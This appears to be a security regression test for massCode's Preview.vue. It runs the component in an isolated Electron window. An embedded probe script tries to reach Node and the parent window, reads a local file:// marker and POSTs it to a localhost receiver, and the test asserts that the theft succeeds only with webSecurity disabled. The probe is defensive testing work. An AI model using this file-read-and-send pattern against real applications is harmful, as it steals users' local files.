const assert = require('node:assert/strict')
const { mkdtemp, readFile, writeFile, rm } = require('node:fs/promises')
const { createServer } = require('node:http')
const { createRequire } = require('node:module')
const { tmpdir } = require('node:os')
const path = require('node:path')
const process = require('node:process')
const { pathToFileURL } = require('node:url')
// Runs the real Preview.vue in an isolated Electron process with synthetic data.
// MASSCODE_PREVIEW_UNSAFE_BASELINE=1 demonstrates the old webSecurity:false bug.
const { app, BrowserWindow } = require('electron')
const { parse, compileScript } = require('vue/compiler-sfc')

const { build } = createRequire(require.resolve('vite'))('esbuild')

const root = path.resolve(__dirname, '../..')
const unsafeBaseline = process.env.MASSCODE_PREVIEW_UNSAFE_BASELINE === '1'
const devOrigin = process.env.MASSCODE_PREVIEW_DEV_ORIGIN === '1'
app.disableHardwareAcceleration()
app.on('window-all-closed', () => {})
let directory
let receiver
let window

async function run() {
  directory = await mkdtemp(path.join(tmpdir(), 'masscode-preview-security-'))
  app.setPath('userData', path.join(directory, 'user-data'))
  const marker = 'masscode-synthetic-preview-marker'
  const fixture = path.join(directory, 'marker.txt')
  await writeFile(fixture, marker)
  const received = []
  const mutations = []
  receiver = createServer((request, response) => {
    if (['/index.html', '/probe.js'].includes(request.url)) {
      response.setHeader('Content-Type', request.url.endsWith('.js') ? 'text/javascript' : 'text/html')
      readFile(path.join(directory, request.url.slice(1))).then(content => response.end(content)).catch(() => {
        response.statusCode = 404
        response.end()
      })
      return
    }
    if (request.url.startsWith('/notes/')) {
      if (request.headers.authorization !== 'Bearer probe-session') {
        response.statusCode = 401
        response.end()
        return
      }
      let body = ''
      request.on('data', (chunk) => {
        body += chunk
      })
      request.on('end', () => {
        mutations.push({ method: request.method, body })
        response.setHeader('Content-Type', 'application/json')
        response.statusCode = request.method === 'POST' ? 201 : 204
        response.end(request.method === 'POST' ? JSON.stringify({ id: 'fixture' }) : undefined)
      })
      return
    }
    if (request.url === '/system/storage-vault-path') {
      response.setHeader('Content-Type', 'application/json')
      response.statusCode
        = request.headers.authorization === 'Bearer probe-session' ? 200 : 401
      response.end(JSON.stringify({ vaultPath: 'synthetic-vault' }))
      return
    }
    response.setHeader('Access-Control-Allow-Origin', '*')
    if (request.url === '/remote.js') {
      response.setHeader('Content-Type', 'text/javascript')
      response.end('window.remoteScriptLoaded = true')
      return
    }
    let body = ''
    request.on('data', (chunk) => {
      body += chunk
    })
    request.on('end', () => {
      received.push(body)
      response.end('ok')
    })
  })
  await new Promise(resolve => receiver.listen(0, '127.0.0.1', resolve))
  const origin = `http://127.0.0.1:${receiver.address().port}`
  const html = `<h1 id="content">Preview works</h1><script src="${origin}/remote.js"></script>`
  const javascript = `(async () => {
    const result = { scriptExecuted: true, remoteScriptLoaded: window.remoteScriptLoaded === true };
    result.nodeAvailable = typeof require !== 'undefined';
    result.cssWorks = getComputedStyle(document.querySelector('#content')).color === 'rgb(1, 2, 3)';
    try { result.parentBridge = !!parent.electron; } catch { result.parentBridge = false; }
    try { result.parentDom = !!parent.document.body; } catch { result.parentDom = false; }
    try {
      const value = await (await fetch(${JSON.stringify(pathToFileURL(fixture).href)})).text();
      result.markerRead = value === ${JSON.stringify(marker)};
      await fetch(${JSON.stringify(`${origin}/receiver`)}, { method: 'POST', body: value });
    } catch { result.markerRead = false; }
    parent.postMessage({ previewProbe: result }, '*');
  })();`
  const contents = [
    { language: 'html', value: html },
    { language: 'css', value: '#content { color: rgb(1, 2, 3) }' },
    { language: 'javascript', value: javascript },
  ]
  const source = await readFile(
    path.join(root, 'src/renderer/components/editor/preview/Preview.vue'),
    'utf8',
  )
  const { descriptor } = parse(source)
  const compiled = compileScript(descriptor, {
    id: 'preview-security',
    inlineTemplate: true,
  })
  await build({
    stdin: {
      contents: `import { createApp } from 'vue'; import Preview from 'probe:preview'; import { api } from '@/services/api';
        window.apiResult = (async () => {
          const value = await (await api.system.getSystemStorageVaultPath()).json();
          await api.notes.postNotes({ name: 'synthetic' });
          await api.notes.patchNotesByIdContent('fixture', { content: 'synthetic update' });
          await api.notes.deleteNotesById('fixture');
          return value;
        })();
        window.probeResult = new Promise(resolve => window.addEventListener('message', event => {
          if (event.data?.previewProbe) resolve(event.data.previewProbe);
        }));
        createApp(Preview).mount('#app');`,
      resolveDir: root,
    },
    bundle: true,
    outfile: path.join(directory, 'probe.js'),
    define: {
      'process.env.NODE_ENV': '"production"',
      '__VUE_OPTIONS_API__': 'true',
      '__VUE_PROD_DEVTOOLS__': 'false',
      '__VUE_PROD_HYDRATION_MISMATCH_DETAILS__': 'false',
    },
    plugins: [
      {
        name: 'preview-fixtures',
        setup(builder) {
          builder.onResolve({ filter: /^@\/services\/api$/ }, () => ({
            path: path.join(root, 'src/renderer/services/api/index.ts'),
          }))
          builder.onResolve(
            {
              filter:
                /^(probe:preview|@\/composables|@\/electron|@\/composables\/useSonner)$/,
            },
            args => ({ path: args.path, namespace: 'fixture' }),
          )
          builder.onLoad({ filter: /.*/, namespace: 'fixture' }, (args) => {
            if (args.path === 'probe:preview') {
              return {
                contents: `import { ref, computed, watch } from 'vue';\n${compiled.content}`,
                loader: 'ts',
                resolveDir: root,
              }
            }
            if (args.path === '@/electron') {
              return {
                contents: `export const { i18n, ipc, store } = window.electron;`,
              }
            }
            if (args.path === '@/composables/useSonner')
              return { contents: `export const useSonner = () => {};` }
            return {
              contents: `import { ref } from 'vue'; const snippet = ref({ id: 'fixture', contents: ${JSON.stringify(contents)} });
            export const useApp = () => ({ state: { snippetId: 'fixture' } });
            export const useSnippets = () => ({ displayedSnippet: snippet, selectedSnippet: snippet, selectedSnippetRecordStatus: ref('ready') });`,
              resolveDir: root,
            }
          })
        },
      },
    ],
  })
  await writeFile(
    path.join(directory, 'index.html'),
    '<!doctype html><div id="app"></div><script src="./probe.js"></script>',
  )
  await writeFile(
    path.join(directory, 'preload.cjs'),
    `const { contextBridge, ipcRenderer } = require('electron'); contextBridge.exposeInMainWorld('electron', {
    ipc: { invoke: (channel, payload) => ipcRenderer.invoke(channel, payload) },
    i18n: { t: x => x }, store: { preferences: { get: () => ${receiver.address().port} } }
  });`,
  )
  await build({
    entryPoints: [
      path.join(root, 'src/main/api/requestIpc.ts'),
      path.join(root, 'src/main/windowSecurity.ts'),
    ],
    bundle: true,
    platform: 'node',
    format: 'cjs',
    outdir: path.join(directory, 'main'),
    outExtension: { '.js': '.cjs' },
  })
  const { registerApiRequestHandler } = require(
    path.join(directory, 'main/api/requestIpc.cjs'),
  )
  const { mainWindowWebPreferences } = require(
    path.join(directory, 'main/windowSecurity.cjs'),
  )
  await app.whenReady()
  window = new BrowserWindow({
    show: false,
    webPreferences: {
      ...mainWindowWebPreferences,
      ...(unsafeBaseline ? { webSecurity: false } : {}),
      preload: path.join(directory, 'preload.cjs'),
    },
  })
  const rendererUrl = devOrigin ? `${origin}/index.html` : pathToFileURL(path.join(directory, 'index.html')).href
  registerApiRequestHandler(
    window.webContents,
    rendererUrl,
    'probe-session',
    receiver.address().port,
  )
  await window.loadURL(rendererUrl)
  const result = await window.webContents.executeJavaScript(
    `Promise.race([window.probeResult, new Promise((_, reject) => setTimeout(() => reject(new Error('Preview probe timed out')), 8000))])`,
  )
  result.exfiltrated = received.includes(marker)
  assert.deepEqual(
    await window.webContents.executeJavaScript('window.apiResult'),
    { vaultPath: 'synthetic-vault' },
  )
  result.desktopApiWorks = true
  assert.deepEqual(mutations, [
    { method: 'POST', body: JSON.stringify({ name: 'synthetic' }) },
    { method: 'PATCH', body: JSON.stringify({ content: 'synthetic update' }) },
    { method: 'DELETE', body: '' },
  ])
  assert.equal(result.scriptExecuted, true)
  assert.equal(result.cssWorks, true)
  assert.equal(result.nodeAvailable, false)
  assert.equal(result.remoteScriptLoaded, true)
  assert.equal(result.parentBridge, false)
  assert.equal(result.parentDom, false)
  assert.equal(result.markerRead, unsafeBaseline)
  assert.equal(result.exfiltrated, unsafeBaseline)
  console.log(JSON.stringify({ unsafeBaseline, devOrigin, ...result }))
}

run().then(
  () => finish(0),
  (error) => {
    console.error(error)
    return finish(1)
  },
)

async function finish(code) {
  if (window && !window.isDestroyed())
    window.destroy()
  if (receiver?.listening)
    await new Promise(resolve => receiver.close(resolve))
  if (directory)
    await rm(directory, { recursive: true, force: true })
  app.exit(code)
}
